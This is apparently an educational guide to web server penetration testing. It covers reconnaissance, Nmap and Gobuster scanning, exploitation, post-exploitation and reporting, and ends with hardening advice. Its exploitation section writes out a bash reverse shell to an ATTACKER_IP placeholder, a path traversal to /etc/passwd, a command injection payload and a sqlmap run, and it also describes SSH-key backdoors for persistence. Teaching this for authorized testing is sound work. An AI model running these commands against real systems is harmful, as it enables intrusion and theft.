# A Comprehensive Guide to Web Server Penetration Testing

**Disclaimer: This guide is for educational and security awareness purposes only. Unauthorized access to computer systems is illegal. Always obtain explicit, written permission before testing any system you do not own.**

## Overview of the Methodology

A structured approach is crucial for a successful and thorough assessment. The process mimics the cyber kill chain and is broken down into the following phases:

1.  **Information Gathering (Reconnaissance)**
2.  **Scanning & Enumeration**
3.  **Vulnerability Assessment**
4.  **Exploitation**
5.  **Post-Exploitation**
6.  **Reporting & Cleanup (Covering Tracks is not typically done in ethical tests)**

---

## Phase 1: Information Gathering (Reconnaissance)

The goal is to learn everything possible about the target with minimal interaction.

### Passive Reconnaissance

*   **WHOIS Lookup:** `whois target.com`
    *   **Purpose:** Discovers domain registration details (registrant, contact info, name servers).
*   **DNS Enumeration:**
    *   **Tools:** `dig`, `nslookup`, `sublist3r`, `Amass`, `Shodan`
    *   **Purpose:** Discovers subdomains (`dev.target.com`, `api.target.com`) and associated IP addresses. Techniques include brute-forcing and checking DNS records (A, AAAA, MX, TXT).
*   **Search Engine Dorking:**
    *   **Example Queries:** `site:target.com ext:log`, `site:target.com intitle:"index of"`, `site:target.com "password"`
    *   **Purpose:** Finds exposed files, directories, and sensitive information indexed by search engines.
*   **Archive Services:**
    *   **Tool:** Wayback Machine (`web.archive.org`)
    *   **Purpose:** Views historical versions of the website, which may reveal old endpoints or sensitive info now removed from the live site.

### Active Reconnaissance

*   **Banner Grabbing:**
    *   **Tool:** `Netcat` - `nc target.com 80`, then type `HEAD / HTTP/1.0<enter><enter>`
    *   **Tool:** `cURL` - `curl -I http://target.com`
    *   **Purpose:** Identifies the web server software (Apache, Nginx, IIS) and its version from the HTTP headers.
*   **Technology Identification:**
    *   **Tool:** `Wappalyzer` (Browser Extension), `WhatWeb` (`whatweb -a3 target.com`)
    *   **Purpose:** Fingerprints the technologies used on the front-end and back-end (e.g., PHP, ASP.NET, WordPress, React).

---

## Phase 2: Scanning & Enumeration

Probing the target to map the attack surface and discover accessible services.

*   **Port Scanning:**
    *   **Tool:** `Nmap` (Network Mapper)
    *   **Command:** `nmap -sS -sV -sC -O -p- -A -T4 target.com`
        *   `-sS`: SYN Stealth Scan.
        *   `-sV`: Version detection.
        *   `-sC`: Run default scripts.
        *   `-p-`: Scan all 65,535 ports.
        *   `-A`: Enable OS detection, version detection, script scanning, and traceroute.
    *   **Purpose:** Finds all open ports and services running on the target (e.g., SSH, FTP, Database ports).
*   **Directory & File Bruteforcing:**
    *   **Tools:** `Gobuster`, `Dirbuster`, `ffuf`
    *   **Command (Gobuster):** `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak`
    *   **Purpose:** Discovers hidden directories (`/admin`, `/backup`), files (`config.php.bak`), and endpoints.

---

## Phase 3: Vulnerability Assessment

Analyzing the gathered data to pinpoint potential weaknesses.

*   **Automated Scanning:**
    *   **Tool:** `Nikto` - `nikto -h http://target.com`
    *   **Tool:** `Nuclei` - `nuclei -u http://target.com -t /path/to/templates/`
    *   **Purpose:** Quickly identifies known vulnerabilities, misconfigurations, and outdated software.
*   **Manual Inspection:**
    *   **Review:** Analyze all input forms (login, search, upload), cookies, and application logic.
    *   **Purpose:** Finds complex vulnerabilities that automated tools miss, such as business logic flaws and insecure direct object references (IDOR).

---

## Phase 4: Exploitation

Leveraging identified vulnerabilities to gain initial access.

### Common Attack Vectors

*   **Misconfigurations:**
    *   **Default Credentials:** Trying `admin:admin` on found login panels.
    *   **Directory Traversal:** `http://target.com/load?file=../../../../etc/passwd`
*   **Software Vulnerabilities:**
    *   **Searching Exploits:** Use `searchsploit Apache 2.4.49` or Metasploit to find and use public exploits for outdated software.
*   **Web Application Attacks:**
    *   **SQL Injection (SQLi):** `sqlmap -u "http://target.com/page?id=1" --dbs`
    *   **File Upload Bypass:** Upload a malicious web shell (e.g., a `.php` file disguised as an image).
    *   **Local File Inclusion (LFI):** Include and execute local files, often leading to Remote Code Execution (RCE) by poisoning log files.
    *   **Command Injection:** `http://target.com/ping?ip=8.8.8.8; whoami`

### Gaining a Foothold: The Reverse Shell

The typical goal is to achieve RCE and get a shell connection back to your machine.

1.  **Set up a listener on your attack machine:**
    ```bash
    nc -nvlp 4444
    ```
2.  **Execute a reverse shell command on the target** (via a vulnerability like SQLi, File Upload, or Command Injection). Example for Linux:
    ```bash
    bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
    ```
3.  If successful, you will receive an interactive shell on your listener.

---

## Phase 5: Post-Exploitation

Actions taken after gaining initial access to expand control.

*   **Privilege Escalation:**
    *   **Linux:** Use `LinPEAS` script to automatically look for misconfigurations, SUID binaries, cron jobs, and kernel exploits.
    *   **Windows:** Use `WinPEAS` or `PowerSploit` modules for similar checks.
*   **Maintaining Persistence:**
    *   Install a backdoor (e.g., add an SSH public key to `~/.ssh/authorized_keys`).
    *   Create a reverse shell service or scheduled task.
*   **Pivoting:**
    *   Use the compromised host as a relay to attack other systems on the internal network.
*   **Data Exfiltration:**
    *   Securely copy sensitive data found during the assessment for the final report.

---

## Phase 6: Reporting

The most critical phase for an ethical hacker. Documentation is key.

*   **Executive Summary:** High-level overview for management.
*   **Technical Findings:** Detailed breakdown of each vulnerability.
    *   **Finding Title:** (e.g., "Critical: SQL Injection on /user?id Parameter")
    *   **Risk Rating:** (e.g., Critical, High, Medium, Low)
    *   **Vulnerability Description:** What is the issue?
    *   **Proof of Concept (PoC):** Step-by-step instructions to reproduce the finding.
    *   **Remediation Steps:** Clear advice on how to fix the issue.
*   **Appendices:** Include full tool output (Nmap, Nikto scans) for technical readers.

---

## Essential Tool Cheat Sheet

| Task | Primary Tools |
| :--- | :--- |
| **Reconnaissance** | `whois`, `dig`, `sublist3r`, `Wappalyzer` |
| **Scanning** | `Nmap`, `Gobuster`/`Dirbuster` |
| **Vulnerability Scanning** | `Nikto`, `Nuclei`, `Burp Suite` |
| **Exploitation** | `Burp Suite`, `sqlmap`, `Metasploit` |
| **Post-Exploitation** | `LinPEAS`/`WinPEAS`, `Netcat` |

## Defense Strategies: How to Secure a Web Server

1.  **Patch Management:** Keep the OS, web server, and all applications updated.
2.  **Hardening:** Follow security benchmarks (e.g., CIS Benchmarks). Disable unnecessary services, use firewalls, and enforce the principle of least privilege.
3.  **Secure Configuration:** Remove default files, hide server banners, disable directory listings.
4.  **Input Validation:** Sanitize all user input on the server-side.
5.  **Web Application Firewall (WAF):** Deploy a WAF to filter malicious traffic.
6.  **Regular Audits:** Conduct periodic penetration tests and vulnerability assessments.